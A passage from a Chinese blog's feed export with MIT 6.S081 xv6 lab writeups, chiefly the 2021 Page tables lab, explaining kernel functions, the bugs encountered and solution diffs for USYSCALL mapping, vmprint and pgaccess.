unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigalarm(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(p->ticks)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(1, (uint64 *)&amp;(p->handler)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigreturn(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// restore registers</span><span class="token prefix inserted">+</span><span class="token line">memmove(p->trapframe, &amp;(p->strapframe), sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">p->ticksum = 0;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..447e6d8 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -77,8 +77,17 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    exit(-1);</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // give up the CPU if this is a timer interrupt.</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(which_dev == 2)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(which_dev == 2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->ticks > 0 &amp;&amp; p->ticksum >= 0 &amp;&amp; ++(p->ticksum) >= p->ticks) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  // save registers</span><span class="token prefix inserted">+</span><span class="token line">  memmove(&amp;(p->strapframe), p->trapframe, sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = -1; // prevent re-entrant calls to the handler</span><span class="token prefix inserted">+</span><span class="token line">  p->trapframe->epc = (uint64)p->handler;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    yield();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  usertrapret();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/user/user.h b/user/user.hindex b71ecda..422a4c1 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,8 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sigalarm(int ticks, void (*handler)()); // here</span><span class="token prefix inserted">+</span><span class="token line">int sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..84c6784 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("sigalarm"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sigreturn");</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用gdb调试xv6内核&quot;&gt;&lt;a href=&quot;#使用gdb调试xv6内核&quot; class=&quot;headerlink&quot; title=&quot;使用gdb调试xv6内核&quot;&gt;&lt;/a&gt;使用gdb调试xv6内核&lt;/h1&gt;&lt;p&gt;从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Page tables</title>
    <link href="http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/"/>
    <id>http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/</id>
    <published>2024-07-01T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:58.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Speed-up-system-calls"><a href="#Speed-up-system-calls" class="headerlink" title="Speed up system calls"></a>Speed up system calls</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目要求在每个进程初始化时为它的页表插入一个页表项，内核通过这样预先缓存页表项的操作，来加速特定系统调用的执行速度。</p><p>由于前不久刚过完一遍《OSTEP》，因此我认为自己对页表机制还算比较熟悉，应对本 Lab 理应比较轻松，但在真正上手的时候，还是觉得有些无所适从，无奈老老实实地把 xv6 手册的第 3 章对照着代码仔细研读了一番，从中提炼出了几个关键的函数：</p><ol><li><code>kernel/kalloc.c:kalloc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历空闲链表，寻找一个可分配的物理页面。若找到，返回该页面的首（物理）地址；否则，返回 0 （空指针）。</p><ol start="2"><li><code>kernel/kalloc.c:kfree</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kfree</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放已分配的首地址为 <code>pa</code> 的物理页面，并更新空闲链表。</p><ol start="3"><li><code>kernel/proc.c:allocproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span><span class="token function">allocproc</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>遍历进程数组 <code>proc</code>，寻找未被使用的 <code>struct proc</code>。若找到，则初始化其状态，为创建一个新的<strong>页表</strong>，并返回指向它的指针；否则，返回 0（空指针）。</p><ol start="4"><li><code>kernel/proc.c:freeproc</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">freeproc</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">proc</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>释放与进程 <code>p</code> 相关的数据的内存空间，并清空 <code>p</code> 的 <code>struct proc</code> 的所有信息。</p><ol start="5"><li><code>kernel/vm.c:mappages</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">mappages</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 size<span class="token punctuation">,</span> uint64 pa<span class="token punctuation">,</span> <span class="token keyword">int</span> perm<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在页表 <code>pagetrable</code> 中创建从起始虚拟地址 <code>va</code> 到起始物理地址 <code>pa</code> 的页表项映射，页表项的 <code>flags</code> 位的访问权限部分设置为 <code>perm</code>，其中大小为 <code>size</code>，将 <code>size</code> 分为若干页，为这些页面创建 <code>va + i * PGSIZE -&gt; pa + i * PGSIZE</code> （<code>i</code> 代表页面的编号）的映射。</p><ol start="6"><li><code>kernel/vm.c:uvmunmap</code></li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">uvmunmap</span><span class="token punctuation">(</span><span class="token class-name">pagetable_t</span> pagetable<span class="token punctuation">,</span> uint64 va<span class="token punctuation">,</span> uint64 npages<span class="token punctuation">,</span> <span class="token keyword">int</span> do_free<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>从 <code>pagetable</code> 中移除从虚拟地址 <code>va</code> 开始的 <code>npages</code> 个页表项。可指定 <code>do_free</code> 的值，若不为 0，则在移除页表项的同时，释放页表项映射 <code>va -&gt; pa</code> 中 <code>pa</code> 指向的内存空间。 </p><p>分析完几个关键函数之后，思路就比较清晰了：</p><ol><li>为 <code>struct proc</code> 结构体添加 <code>struct usyscall *usc</code> 段。</li><li>在 <code>allocproc()</code> 中为 <code>usc</code> 分配物理内存，并对其赋值：<code>p-&gt;usc-&gt;pid = p-&gt;pid;</code>。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">usyscall</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">kalloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">freeproc</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token operator">-></span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>p<span class="token operator">-></span>usc<span class="token operator">-></span>pid <span class="token operator">=</span> p<span class="token operator">-></span>pid<span class="token punctuation">;</span></code></pre><ol start="3"><li>在 <code>freeproc()</code> 中释放 <code>usc</code> 的物理内存。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token function">kfree</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">;</span>p<span class="token operator">-></span>usc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></code></pre><ol start="4"><li>在 <code>proc_pagetable()</code> 中使用 <code>mappages</code> 插入虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mappages</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span><span class="token punctuation">(</span>p<span class="token operator">-></span>usc<span class="token punctuation">)</span><span class="token punctuation">,</span> PTE_R <span class="token operator">|</span> PTE_U<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAMPOLINE<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> TRAPFRAME<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">uvmfree</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><ol start="5"><li>最后，非常容易忽视的，在 <code>proc_freepagetable()</code> 中删除虚拟地址 <code>USYSCALL</code> 的页表项。</li></ol><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">uvmunmap</span><span class="token punctuation">(</span>pagetable<span class="token punctuation">,</span> USYSCALL<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>接下来讲讲我在本题遇到的几个问题。</p><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn1.png"></p><p><strong>原因：</strong> <code>p-&gt;usc-&gt;pid = p-&gt;pid</code> 放在分配物理内存之前，导致空指针解引用。</p><p><strong>问题 2：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/pn2.png"></p><p><strong>原因：</strong> 未在 <code>proc_freepagetable()</code> 中解除 <code>USYSCALL</code> 的页表项映射，也就是上面提到的容易忽视的第 5 点。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..5fc573f 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -127,6 +127,14 @@ found:<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if ((p->usc = (struct usyscall *)kalloc()) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">freeproc(p);</span><span class="token prefix inserted">+</span><span class="token line">release(&amp;p->lock);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  p->usc->pid = p->pid;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  // An empty user page table.</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = proc_pagetable(p);</span><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable == 0)&#123;</span></span>@@ -153,6 +161,9 @@ freeproc(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->trapframe)</span><span class="token prefix unchanged"> </span><span class="token line">    kfree((void*)p->trapframe);</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe = 0;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (p->usc) // here</span><span class="token prefix inserted">+</span><span class="token line">kfree((void*)p->usc);</span><span class="token prefix inserted">+</span><span class="token line">  p->usc = 0;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(p->pagetable)</span><span class="token prefix unchanged"> </span><span class="token line">    proc_freepagetable(p->pagetable, p->sz);</span><span class="token prefix unchanged"> </span><span class="token line">  p->pagetable = 0;</span></span>@@ -195,6 +206,14 @@ proc_pagetable(struct proc *p)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    uvmfree(pagetable, 0);</span><span class="token prefix unchanged"> </span><span class="token line">    return 0;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if (mappages(pagetable, USYSCALL, PGSIZE, (uint64)(p->usc), PTE_R | PTE_U) &lt; 0) &#123;  </span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmunmap(pagetable, TRAPFRAME, 1, 0);</span><span class="token prefix inserted">+</span><span class="token line">uvmfree(pagetable, 0);</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return pagetable;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -206,6 +225,7 @@ proc_freepagetable(pagetable_t pagetable, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAMPOLINE, 1, 0);</span><span class="token prefix unchanged"> </span><span class="token line">  uvmunmap(pagetable, TRAPFRAME, 1, 0);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, USYSCALL, 1, 0); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  uvmfree(pagetable, sz);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..d25a729 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -82,6 +82,8 @@ struct trapframe &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">enum procstate &#123; UNUSED, USED, SLEEPING, RUNNABLE, RUNNING, ZOMBIE &#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct usyscall;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">// Per-process state</span><span class="token prefix unchanged"> </span><span class="token line">struct proc &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct spinlock lock;</span></span>@@ -105,4 +107,7 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  struct usyscall *usc;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span></code></pre><h1 id="Print-a-page-table"><a href="#Print-a-page-table" class="headerlink" title="Print a page table"></a>Print a page table</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>仿照 <code>freewalk</code> 函数的写法，递归查找所有有效的页表项，并根据题干要求打印相关信息。涉及的内容较少，如果认真把上面提到的几个关键函数理清楚，并且理解了多级页表的机制，写起来还是比较轻松的，流程如下：</p><p>遍历当前页表中的所有页表项，如果页表项有效（flags 的有效位为 1），则将该页表项转换为物理地址向下递归搜索。需要注意的是在递归查找到第 3 级页表时，就不能继续向下递归了，此时得到的 <code>pa</code> 就是进行虚实地址转换后的物理地址。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex 3564db4..d169300 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -170,6 +170,7 @@ uint64          walkaddr(pagetable_t, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyout(pagetable_t, uint64, char *, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/exec.c b/kernel/exec.cindex d62d29d..89f3d74 100644<span class="token coord">--- a/kernel/exec.c</span><span class="token coord">+++ b/kernel/exec.c</span>@@ -115,6 +115,11 @@ exec(char *path, char **argv)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->epc = elf.entry;  // initial program counter = main</span><span class="token prefix unchanged"> </span><span class="token line">  p->trapframe->sp = sp; // initial stack pointer</span><span class="token prefix unchanged"> </span><span class="token line">  proc_freepagetable(oldpagetable, oldsz);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // here</span><span class="token prefix inserted">+</span><span class="token line">  if(p->pid == 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint(p->pagetable);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  return argc; // this ends up in a0, the first argument to main(argc, argv)</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..23eeec9 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -432,3 +432,25 @@ copyinstr(pagetable_t pagetable, char *dst, uint64 srcva, uint64 max)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    return -1;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void vmprint_recur(pagetable_t pagetable, int depth) &#123;</span><span class="token prefix inserted">+</span><span class="token line">for (int i = 0; i &lt; 512; ++i) &#123;</span><span class="token prefix inserted">+</span><span class="token line">pte_t pte = pagetable[i];</span><span class="token prefix inserted">+</span><span class="token line">if (pte &amp; PTE_V) &#123; // pte is valid</span><span class="token prefix inserted">+</span><span class="token line">for (int j = 0; j &lt; depth; ++j) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf(" ..");</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">uint64 child = PTE2PA(pte);</span><span class="token prefix inserted">+</span><span class="token line">printf("%d: pte %p pa %p\n", i, pte, child);</span><span class="token prefix inserted">+</span><span class="token line">if (depth &lt; 3) &#123;</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur((pagetable_t)child, depth + 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void vmprint(pagetable_t pagetable) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("page table %p\n", pagetable);</span><span class="token prefix inserted">+</span><span class="token line">vmprint_recur(pagetable, 1);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span></code></pre><h1 id="Detecting-which-pages-have-been-accessed"><a href="#Detecting-which-pages-have-been-accessed" class="headerlink" title="Detecting which pages have been accessed"></a>Detecting which pages have been accessed</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>题目要求实现一个系统调用 <code>sys_pgaccess()</code>，获取指定虚拟页面的<strong>最近被访问信息</strong>。</p><p>算是一个大杂烩的题，把 Lab System calls 的内容和 pagetable 结合起来，不要被 hard 难度标签吓到了，只要前面的 Lab 全都认真完成，再运用一些位运算的技巧，本题其实并不 “hard”。</p><p>所有的系统调用需要的声明已经实现添加好了，我们只需要关注 <code>sys_pgaccess()</code> 的实现即可，基本流程如下：</p><ol><li>和 Lab System calls 一样，使用 <code>argint()</code> 和 <code>argaddr()</code> 获取用户空间传递的参数：<code>base</code>、<code>len</code>、<code>mask</code>。</li><li>函数体内定义一个 <code>kmask</code>，作为 <code>mask</code> 的缓冲区。</li><li>从地址 <code>base</code> 开始遍历连续的 <code>len</code> 的页面，获取该页面的页表项 <code>pte</code>，根据 <code>pte</code> 的访问位对 <code>kmask</code> 进行置位，注意不要忘了每次遍历后将 <code>pte</code> 的访问位置 0。</li><li>遍历完成后，使用 <code>copyout()</code> 将 <code>kmask</code> 的数据存入用户空间 <code>mask</code> 处。</li></ol><p>有一个值得注意的问题，根据提示：</p><blockquote><p>It’s okay to set an upper limit on the number of pages that can be scanned.</p></blockquote><p>可以设定一个最大扫描范围，这主要根据 <code>kmask</code> 的数据类型而定，这里我选择使用 <code>long</code> 类型，那么最大扫描范围自然就是 64（<code>long</code> 类型为 8 字节大小，64 bit）。</p><p>同时，在对 <code>kmask</code> 操作时，可以运用一些位运算的技巧：</p><p>首先可以将 <code>kmask</code> 置为 0（二进制位全为 0），如果页面 i 的访问位为 1，则使用 <code>kmask |= (1 &lt;&lt; i)</code>，将 <code>kmask</code> 第 i 位置为 1 而不影响其它位（<code>0 | 0 = 0; 1 | 0 = 1</code>）。</p><p>要清除 <code>pte</code> 的访问位，可使用 <code>*pte &amp;= ~PTE_A</code>，其中 <code>PTE_A = 1L &lt;&lt; 6</code>，即访问位为 1，其它位都为 0，取反后，访问位为 0，其它位都为 1，与其进行按位与运算可将访问位置为 0，而不影响其它位（<code>0 &amp; 1 = 0; 1 &amp; 1 = 1</code>）。</p><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p><strong>问题 1：</strong></p><p><img src="/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/walk.png"></p><p><strong>原因：</strong> 比较坑的一个问题，原因是 <code>kernel/defs.h</code> 中没有 <code>walk</code> 函数声明，需要手动添加。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/kernel/defs.h b/kernel/defs.hindex d169300..53f1f88 100644<span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -171,6 +171,7 @@ int             copyout(pagetable_t, uint64, char *, uint64);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">void            vmprint(pagetable_t); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t *walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..6b130fe 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,7 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_A (1L &lt;&lt; 6) // access bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token 